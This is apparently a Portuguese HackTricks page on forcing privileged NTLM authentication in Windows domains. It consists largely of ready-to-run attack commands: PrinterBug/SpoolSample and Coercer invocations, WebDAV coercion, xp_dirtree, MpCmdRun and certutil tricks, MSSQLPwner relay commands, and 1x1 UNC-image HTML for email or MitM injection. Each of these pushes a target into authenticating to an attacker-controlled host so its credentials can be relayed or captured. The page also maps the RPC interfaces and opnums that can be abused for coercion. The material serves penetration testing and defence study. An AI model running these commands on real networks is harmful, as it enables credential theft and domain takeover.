# Forçar autenticação privilegiada NTLM

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) é uma **coleção** de **gatilhos de autenticação remota** programados em C# usando o compilador MIDL para evitar dependências de terceiros.

## Abuso do Spooler Service

Se o serviço _**Print Spooler**_ estiver **habilitado,** você pode usar algumas credenciais de AD já conhecidas para **solicitar** ao servidor de impressão do Controlador de Domínio uma **atualização** sobre novos trabalhos de impressão e simplesmente instruí-lo a **enviar a notificação para algum sistema**.\
Observe que, quando a impressora envia a notificação para sistemas arbitrários, ela precisa se **autenticar nesse** **sistema**. Portanto, um atacante pode fazer com que o serviço _**Print Spooler**_ se autentique em um sistema arbitrário, e o serviço **usará a conta do computador** nessa autenticação.

Nos bastidores, a primitiva clássica **PrinterBug** abusa de **`RpcRemoteFindFirstPrinterChangeNotificationEx`** por meio de **`\\PIPE\\spoolss`**. Primeiro, o atacante abre um handle de impressora/servidor e, em seguida, fornece um nome de cliente falso em `pszLocalMachine`, fazendo com que o spooler do alvo crie um canal de notificação **de volta para o host controlado pelo atacante**. É por isso que o efeito é uma **coerção de autenticação de saída**, e não execução direta de código.<sup>[[2]](#references)</sup>\
Se você está procurando **RCE/LPE** no próprio spooler, consulte [PrintNightmare](printnightmare.md). Esta página é focada em **coerção e relay**.

### Encontrando servidores Windows no domínio

Use o PowerShell para listar hosts Windows. Os servidores geralmente são os alvos de maior prioridade, então concentre-se neles primeiro:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Identificando serviços Spooler em escuta

Usando uma versão ligeiramente modificada do [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) de @mysmartlogin (Vincent Le Toux), verifique se o Spooler Service está em escuta:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Você também pode usar `rpcdump.py` no Linux e procurar pelo protocolo **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Ou teste rapidamente os hosts a partir do Linux com **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Se você quiser **enumerar as superfícies de coerção** em vez de apenas verificar se o endpoint do spooler existe, use o **modo de scan do Coercer**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Isso é útil porque ver o endpoint no EPM apenas informa que a interface RPC de impressão está registrada. Isso **não** garante que todos os métodos de coerção sejam acessíveis com seus privilégios atuais ou que o host emitirá um fluxo de autenticação utilizável.

### Solicitar que o serviço se autentique em um host arbitrário

Você pode compilar o [SpoolSample a partir daqui](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ou use [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ou [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) se estiver no Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Com o **Coercer**, você pode direcionar diretamente as interfaces do spooler e evitar adivinhar qual método RPC está exposto:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Forçando HTTP em vez de SMB com WebClient

O PrinterBug clássico geralmente resulta em uma autenticação **SMB** para `\\attacker\share`, que ainda é útil para **capture**, **relay para alvos HTTP** ou **relay quando a assinatura SMB está ausente**.\
No entanto, em ambientes modernos, fazer **relay de SMB para SMB** costuma ser bloqueado pela **assinatura SMB**, portanto os operadores geralmente preferem forçar a autenticação **HTTP/WebDAV**.

Se o alvo tiver o serviço **WebClient** em execução, o listener pode ser especificado em um formato que faça o Windows usar **WebDAV over HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Isso é especialmente útil ao encadear com **`ntlmrelayx --adcs`** ou outros alvos de HTTP relay, pois evita depender da possibilidade de SMB relay na conexão coagida. A ressalva importante é que o **WebClient deve estar em execução** na vítima para que a variante HTTP/WebDAV funcione.

### Combinando com Unconstrained Delegation

Se um atacante comprometeu um computador configurado para [Unconstrained Delegation](unconstrained-delegation.md), ele pode **coagir a impressora a se autenticar nesse computador**. O **TGT** da conta de computador da impressora é então armazenado em cache na memória do host com unconstrained delegation, onde o atacante pode recuperá-lo e reutilizá-lo com [Pass the Ticket](pass-the-ticket.md).

## Forçar autenticação RPC

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### Matriz de coerção por caminho UNC via RPC (interfaces/opnums que acionam autenticação de saída)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: interface de impressão assíncrona no mesmo pipe do spooler; use o Coercer para enumerar métodos acessíveis em um determinado host<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (também via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums comumente abusados: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Nota: esses métodos aceitam parâmetros que podem transportar um caminho UNC (por exemplo, `\\attacker\share`). Ao serem processados, o Windows se autentica (no contexto de máquina/usuário) nesse UNC, permitindo a captura ou o relay de NetNTLM.\
Para abuso do spooler, o **MS-RPRN opnum 65** continua sendo a primitiva mais comum e melhor documentada, pois a especificação do protocolo afirma explicitamente que o servidor cria um canal de notificação de volta para o cliente especificado por `pszLocalMachine`.<sup>[[2]](#references)</sup>

### Coerção MS-EVEN: ElfrOpenBELW (opnum 9)
- Interface: MS-EVEN sobre \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Assinatura da chamada: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Efeito: o alvo tenta abrir o caminho de log de backup fornecido e se autentica no UNC controlado pelo atacante.<sup>[[1]](#references)</sup>
- Uso prático: coagir ativos Tier 0 (DC/RODC/Citrix/etc.) a emitirem NetNTLM e então fazer relay para endpoints do AD CS (cenários ESC8/ESC11) ou outros serviços privilegiados.<sup>[[1]](#references)</sup>

## PrivExchange

O ataque `PrivExchange` é resultado de uma falha encontrada no **recurso `PushSubscription` do Exchange Server**. Esse recurso permite que o servidor Exchange seja forçado, por qualquer usuário do domínio com uma mailbox, a se autenticar em um host fornecido pelo cliente via HTTP.

Por padrão, o **serviço do Exchange é executado como SYSTEM** e recebe privilégios excessivos (especificamente, possui **privilégios WriteDacl no domínio antes da Cumulative Update de 2019**). Essa falha pode ser explorada para permitir o **relay de informações para LDAP e, subsequentemente, extrair o banco de dados NTDS do domínio**. Quando o relay para LDAP não é possível, essa falha ainda pode ser usada para fazer relay e autenticar em outros hosts dentro do domínio. A exploração bem-sucedida desse ataque concede acesso imediato ao Domain Admin com qualquer conta de usuário do domínio autenticada.

## Dentro do Windows

Se você já estiver dentro da máquina Windows, poderá forçar o Windows a se conectar a um servidor usando contas privilegiadas com:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ou use esta outra technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

É possível usar o lolbin certutil.exe (binário assinado pela Microsoft) para coagir a autenticação NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

Se você souber o **endereço de email** do usuário que faz login em uma máquina que deseja comprometer, basta enviar a ele um **email com uma imagem de 1x1** como
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
Quando a vítima o abre, o Windows tenta se autenticar.

### MitM

Se você conseguir realizar um ataque MitM e injetar HTML em uma página visualizada pela vítima, tente injetar uma imagem como:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Outras formas de forçar e realizar phishing de autenticação NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Quebrando NTLMv1

Se você conseguir capturar [desafios NTLMv1, leia aqui como quebrá-los](../ntlm/index.html#ntlmv1-attack).\
_Lembre-se de que, para quebrar NTLMv1, você precisa definir o desafio do Responder como "1122334455667788"_

## References

- [1] [Unit 42 – A coerção de autenticação continua evoluindo](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: Protocolo de remoting do EventLog](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
{{#include ../../banners/hacktricks-training.md}}
